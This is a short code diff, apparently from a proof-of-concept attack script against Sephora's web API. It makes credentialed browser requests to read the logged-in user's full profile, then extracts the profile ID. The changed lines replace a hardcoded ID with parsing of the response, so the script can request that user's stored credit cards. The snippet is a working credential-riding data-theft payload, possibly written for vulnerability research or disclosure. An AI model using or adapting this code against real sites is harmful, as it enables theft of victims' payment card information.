@@ -3,7 +3,8 @@ xhr.withCredentials=true;
 xhr.open("GET","https://www.sephora.com/api/users/profiles/current/full?includeApis=profile");
 xhr.onreadystatechange=()=>{if(xhr.readyState==4){
 var resp=xhr.responseText
-id=1123;
+var id = resp.match(/profileId\":\"[0-9]+/g);
+id=id[0].slice(12, id[0].length);
 
 xhr.open("GET",`https://www.sephora.com/api/users/profiles/${id}/creditCards`);
 xhr.withCredentials=true;
